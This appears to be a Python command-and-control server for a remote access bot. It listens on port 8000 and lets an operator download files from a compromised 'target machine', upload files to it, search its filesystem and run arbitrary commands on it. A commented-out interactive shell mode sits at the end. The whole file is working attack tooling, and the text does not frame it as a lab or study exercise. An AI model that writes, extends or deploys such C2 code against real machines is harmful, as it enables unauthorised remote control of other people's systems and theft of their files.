#!/usr/bin/env python3



import socket, base64, sys, time

def base64_decode(data):
    """This function removes the delimter from the encoded data as well as the padding
    Args:
        data (bytearray): The encoded data
    Returns:
        bytearray: base64 decoded data
    """
    delim = b'!!#@'  # Establish the delimiter for EOT detection
    data = data.split(delim)[0]  # Remove the delimiter
    return base64.b64decode(data).replace(b'=', b'')  # Remove the padding from the data and return it

def base64_encode(data):
    """This function encodes the data in base64 and adds the delimiter and padding

    Args:
        data (bytearray): data to encode

    Returns:
        bytearray: the base64 encoded data
    """    
    delim = b'!!#@'  # Establish the delimiter for EOT detection
    if len(data) % 4 != 0:  # Check to see if the data is a multiple of 4
        data += b'=' * (4 - (len(data) % 4))  # If not, add padding
    return base64.b64encode(data) + delim  # Return the encoded data

# TODO: Add input validation
# def input_validator(input_prompt):
#     output = ""
#     while output == "":
#         output = input(input_prompt)
#     return output
    

def command_input(os_type):
    """This function takes the user command and gathers the necessary information to send to the bot

    Args:
        os_type (str): The operating system of the target machine

    Returns:
        command (str): The command to send to the bot
        file_name (str): The name of the file to download/upload
        file_destination (str): The destination of the file to upload
        starting_directory (str): The starting directory for the search
    """

    command = ""
    file_name = ""
    file_destination = ""
    starting_directory = ""
    while command == "":  # While loop to ensure the user enters a command
        command = input(os_type + "> ")
        if command.lower() == "download":  # If the user enters download, prompt for a file name
            while file_name == "":  # While loop to ensure the user enters a file name
                file_name = input("Enter the file's absolute path> ")  # Filename to download
        elif command.lower() == 'upload':  # If the user enters upload, prompt for a file name
            while file_name == "":  # While loop to ensure the user enters a file name
                file_name = input("Enter the file's absolute path> ")  # Filename to upload
                file_destination = input("Enter the destination path> ")  # Prompt the user for a file destination to upload to
        elif command.lower() == "search":  # If the user enters search, prompt for a file name
            while file_name == "":  # While loop to ensure the user enters a file name
                file_name = input("Enter the file name> ")  # File name to search for
                starting_directory = input("Enter the starting directory> ")
    # Return the command and file name
    return command, file_name, file_destination, starting_directory

def download_file(socket, file_name, command="download"):
    """This function downloads a file from the target machine
    Args:
        socket (Socket.Object): The socket to receive data from
        file_name (str): The name of the file to download
    """
    # The bot is looking for command in specific format
    command = command + " " + file_name
    socket.send(command.encode())  # Send the command to the bot
    full_file = receive_data(socket)  # Receive the file data
    # The bot will send a message if the file does not exist
    if base64_decode(full_file) == b"[-] File not found":
        print("\nFile not found\n")
        return
    # Write the file to directory the user chooses
    else:
        file_out_location = input("Where would you like to save the file? ")
        with open(file_out_location, 'wb') as f:
            f.write(base64_decode(full_file))

def upload_file(socket, file_name, file_destination, command="upload"):
    """This function uploads a file to the target machine
    Args:
        socket (Socket.Object): The socket to send data to
        file_name (str): The name of the file to upload
        file_destination (str): The destination of the file to upload
    """
    # Bot is looking for command in specific format
    command = command + " " + file_name + " " + file_destination
    # Send the command to the bot
    socket.send(command.encode())
    # Read the file into memory
    try:
        with open(file_name, 'rb') as f:
            file_data = f.read()
            file_data = base64_encode(file_data)
            socket.sendall(file_data)
    except:
        print("File not found")
    # Encode the file data
    # TODO: Add error handling for file not found

def receive_data(socket):
    """This function receives the data from the socket and returns it
    Args:
        socket (Socket.Object): The socket to receive data from
    Returns:
        data (bytearray): The data received from the socket
    """
    # Create a list to hold the fragments of data, dramatically increases speed
    fragments = []
    while True:  # While loop to receive all the data
        chunk = socket.recv(4096)  # Each chunk is 4096 bytes
        # If the length of the chunk is less than 4096, we have received all the data
        if  len(chunk) < 4096:
            fragments.append(chunk)  # Append the last chunk to the list and break out of the loop
            break
        fragments.append(chunk) # Append the chunk to the list
    full_data = b''.join(fragments)  # Join the list of fragments into a single bytearray
    return full_data  # Return the full data

def help_menu():
    """This function prints the help menu to the user
    """
    print("Commands:")
    print("download - Downloads a file from the target machine")
    print("upload - Uploads a file to the target machine")
    print("search - Searches for a file on the target machine")
    print("quit - Exits the program")
    print("help - Displays this menu")

def main():
    """ Start a server and listen for connections. Once a connection is established, the user can take control of the bot;
    allow the user to send commands, receive data, and upload/download files as well as search for files on the target machine
    """
    c2_server = socket.socket()  # Create a socket object
    c2_server.bind(("0.0.0.0", 8000))  # Bind the socket to the IP and port
    print("Listening on port 8000")  # Let the user know the server is listening
    c2_server.listen(1)  # Listen for connections
    while True:  # While loop to keep the server running
        client, address = c2_server.accept() # Accept the connection
        print(f"Connection from {address} has been established!")  # Let the user know a connection has been established
        os_family = receive_data(client)  # Receive the operating system of the target machine
        os_family = base64_decode(os_family)  # Decode the operating system
        os_family = os_family.decode()  # Convert the operating system to a string
        user_continue = True  # Boolean to keep the user in the loop
        while user_continue:  # While loop to keep the user in the loop
            # Get the command from the user
            command, file_name, file_destination, starting_directory = command_input(os_family)
            if command.lower() == "download":  # If the user enters download, download the file
                download_file(client, file_name)
            elif command.lower() == "upload":  # If the user enters upload, upload the file
                upload_file(client, file_name, file_destination)
            elif command.lower() == "search":  # If the user enters search, search for the file
                # TODO: Add this to new function
                command = command + " " + file_name + " " + starting_directory
                client.send(command.encode())
                full_data = receive_data(client)
                decoded_data = base64_decode(full_data)
                print(decoded_data.decode())
            elif command.lower() == "quit":  # If the user enters quit, close the connection on both ends
                client.send(command.encode())
                user_continue = False
                client.close()
            elif command.lower() == "help":  # If the user enters help, display the help menu
                help_menu()
            
            # Check to see if the user entered quit
            else:  # If the user didn't enter any keywords, send the command to the bot
                client.send(command.encode())
                if command.lower() == "quit":
                    user_continue = False
                # Receive the data from the bot
                full_data = receive_data(client)  # Receive the data from the bot
                decoded_data = base64_decode(full_data)  # Decode the data
                print(decoded_data.decode())  # Print the data to the user
        client.close()  # Close the connection
        exit()  # Exit the program

main()


 # if command.lower() == "shell":
                #     while True:
                #         full_data = client.recv(4096).decode()
                #         sys.stdout.write(full_data)
                #         command = input()

                #         #Send the command to the bot
                #         command += "\n"
                #         client.send(command.encode())
                #         time.sleep(1)

                #         #Remove the output of the 'input' function
                #         sys.stdout.write("\033[A" + full_data.split("\n")[-1])
